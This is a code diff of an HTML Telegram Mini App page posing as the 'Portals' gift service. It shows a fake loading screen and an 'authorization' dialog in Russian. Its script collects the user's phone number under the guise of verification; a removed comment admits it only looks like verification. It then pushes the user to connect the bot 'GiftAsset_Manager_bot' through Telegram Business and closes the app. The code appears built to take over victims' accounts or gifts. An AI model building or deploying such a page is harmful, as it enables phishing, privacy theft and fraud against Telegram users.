@@ -5,239 +5,72 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #0b0b0b;
-            color: white;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        /* Фоновые иконки */
-        .bg-icons {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            opacity: 0.6;
-            background: radial-gradient(circle at center, transparent 0%, #0b0b0b 90%);
-        }
-
-        .icon {
-            position: absolute;
-            width: 60px;
-            height: 60px;
-            background-size: contain;
-            background-repeat: no-repeat;
-            filter: drop-shadow(0 0 10px rgba(255,255,255,0.1));
-        }
-
-        .icon-1 { top: 10%; right: 20%; background-image: url('https://img.icons8.com/emoji/96/helmet-with-white-cross.png'); transform: rotate(15deg); }
-        .icon-2 { top: 30%; left: 15%; background-image: url('https://img.icons8.com/emoji/96/skull-emoji.png'); transform: rotate(-10deg); }
-        .icon-3 { top: 35%; right: 10%; background-image: url('https://img.icons8.com/emoji/96/frog-face.png'); transform: rotate(5deg); }
-        .icon-4 { bottom: 25%; left: 10%; background-image: url('https://img.icons8.com/emoji/96/gem-stone.png'); }
-        .icon-5 { bottom: 30%; right: 15%; background-image: url('https://img.icons8.com/emoji/96/pig-face.png'); }
-        .icon-6 { bottom: 10%; left: 45%; background-image: url('https://img.icons8.com/emoji/96/watch-emoji.png'); }
-
-        /* Логотип и Загрузка */
-        .loader-container {
-            position: relative;
-            z-index: 10;
-            text-align: center;
-            width: 80%;
-            transition: opacity 0.5s ease;
-        }
-
-        .logo {
-            font-size: 32px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .logo-icon {
-            width: 40px;
-            height: 40px;
-            border: 3px solid white;
-            border-radius: 10px 10px 0 0;
-            margin-bottom: 5px;
-            position: relative;
-        }
-
-        .logo-icon::after {
-            content: '';
-            position: absolute;
-            bottom: -5px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 15px;
-            height: 5px;
-            background: white;
-        }
-
-        .progress-bar-bg {
-            width: 100%;
-            height: 6px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 10px;
-            overflow: hidden;
-        }
-
-        .progress-bar-fill {
-            width: 0%;
-            height: 100%;
-            background: white;
-            transition: width 0.1s linear;
-        }
-
-        /* Модальное окно */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 100;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            backdrop-filter: blur(8px);
-        }
-
-        .modal-card {
-            background: #1c1c1e;
-            width: 85%;
-            max-width: 320px;
-            border-radius: 28px;
-            padding: 24px;
-            text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
-            animation: slideUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes slideUp {
-            from { transform: translateY(100px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-
-        .modal-card h2 { font-size: 22px; margin-bottom: 12px; }
-        .modal-card p { color: #8e8e93; font-size: 15px; line-height: 1.4; margin-bottom: 20px; }
-
-        .info-badge {
-            background: rgba(36, 161, 222, 0.15);
-            color: #24a1de;
-            padding: 10px;
-            border-radius: 14px;
-            font-size: 13px;
-            display: block;
-            margin-bottom: 24px;
-        }
-
-        .login-btn {
-            background: #24a1de;
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 16px;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: transform 0.1s;
-        }
-
-        .login-btn:active { transform: scale(0.96); }
-
-        .footer-text { margin-top: 15px; font-size: 11px; color: #636366; }
+        body { margin: 0; padding: 0; background-color: #0b0b0b; color: white; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .bg-icons { position: absolute; width: 100%; height: 100%; opacity: 0.4; z-index: 1; }
+        .loader-container { position: relative; z-index: 10; text-align: center; width: 80%; }
+        .logo { font-size: 32px; font-weight: 600; margin-bottom: 20px; }
+        .progress-bar-bg { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
+        .progress-bar-fill { width: 0%; height: 100%; background: white; transition: width 0.1s linear; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; display: none; justify-content: center; align-items: center; backdrop-filter: blur(8px); }
+        .modal-card { background: #1c1c1e; width: 85%; max-width: 320px; border-radius: 28px; padding: 24px; text-align: center; }
+        .login-btn { background: #24a1de; color: white; border: none; width: 100%; padding: 16px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        .info-badge { background: rgba(36, 161, 222, 0.15); color: #24a1de; padding: 10px; border-radius: 14px; font-size: 13px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
-
-    <div class="bg-icons">
-        <div class="icon icon-1"></div>
-        <div class="icon icon-2"></div>
-        <div class="icon icon-3"></div>
-        <div class="icon icon-4"></div>
-        <div class="icon icon-5"></div>
-        <div class="icon icon-6"></div>
-    </div>
-
+    <div class="bg-icons"></div>
     <div class="loader-container" id="loader">
-        <div class="logo">
-            <div class="logo-icon"></div>
-            Portals
-        </div>
-        <div class="progress-bar-bg">
-            <div class="progress-bar-fill" id="progress"></div>
-        </div>
+        <div class="logo">Portals</div>
+        <div class="progress-bar-bg"><div class="progress-bar-fill" id="progress"></div></div>
     </div>
 
     <div class="modal-overlay" id="modal">
         <div class="modal-card">
-            <h2>Авторизация</h2>
-            <p>Для оценки вашей коллекции и верификации аккаунта необходимо подтвердить владение профилем.</p>
-
-            <div class="info-badge">
-                🔐 Безопасная авторизация через протокол Telegram Business.
-            </div>
-
-            <button class="login-btn" onclick="startConnect()">
-                ПОДТВЕРДИТЬ И ВОЙТИ
-            </button>
-
-            <div class="footer-text">
-                Продолжая, вы подтверждаете, что вам исполнилось 18 лет.
-            </div>
+            <h2 id="modalTitle">Авторизация</h2>
+            <p id="modalText">Для оценки вашей коллекции необходимо подтвердить владение профилем.</p>
+            <div class="info-badge" id="infoBadge">🔐 Безопасная верификация через Telegram Business.</div>
+            <button class="login-btn" id="mainButton" onclick="handleAction()">ПОДТВЕРДИТЬ И ВОЙТИ</button>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        tg.enableClosingConfirmation();
 
+        let step = 1;
         let width = 0;
         const progressBar = document.getElementById('progress');
-        const loader = document.getElementById('loader');
-        const modal = document.getElementById('modal');
 
         const interval = setInterval(() => {
             if (width >= 100) {
                 clearInterval(interval);
-                setTimeout(() => {
-                    loader.style.opacity = '0';
-                    setTimeout(() => {
-                        loader.style.display = 'none';
-                        modal.style.display = 'flex';
-                    }, 500);
-                }, 300);
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('modal').style.display = 'flex';
             } else {
-                width += 1;
+                width += 2;
                 progressBar.style.width = width + '%';
             }
-        }, 25);
+        }, 30);
 
-        function startConnect() {
-            // 1. Запрос номера (выглядит как верификация)
-            tg.requestContact((ok) => {
-                if (ok) {
-                    // 2. Если номер дан, перекидываем на привязку бизнеса
-                    const botUser = "GiftAsset_Manager_bot";
-                    const link = `https://t.me/${botUser}?startbusiness=auth`;
-                    tg.openTelegramLink(link);
-                } else {
-                    tg.showAlert("Для оценки коллекции необходимо подтвердить статус владельца через номер телефона.");
-                }
-            });
+        function handleAction() {
+            if (step === 1) {
+                tg.requestContact((ok) => {
+                    if (ok) {
+                        step = 2;
+                        document.getElementById('modalTitle').innerText = "Шаг 2: Шлюз";
+                        document.getElementById('modalText').innerText = "Номер подтвержден. Теперь подключите модуль оценки подарков.";
+                        const btn = document.getElementById('mainButton');
+                        btn.innerText = "ПОДКЛЮЧИТЬ ОЦЕНКУ 🎁";
+                        btn.style.background = "#31b545";
+                    }
+                });
+            } else {
+                const botUser = "GiftAsset_Manager_bot";
+                tg.openTelegramLink(`https://t.me/${botUser}?startbusiness=auth`);
+                setTimeout(() => { tg.close(); }, 1000);
+            }
         }
     </script>
 </body>
 </html>
+
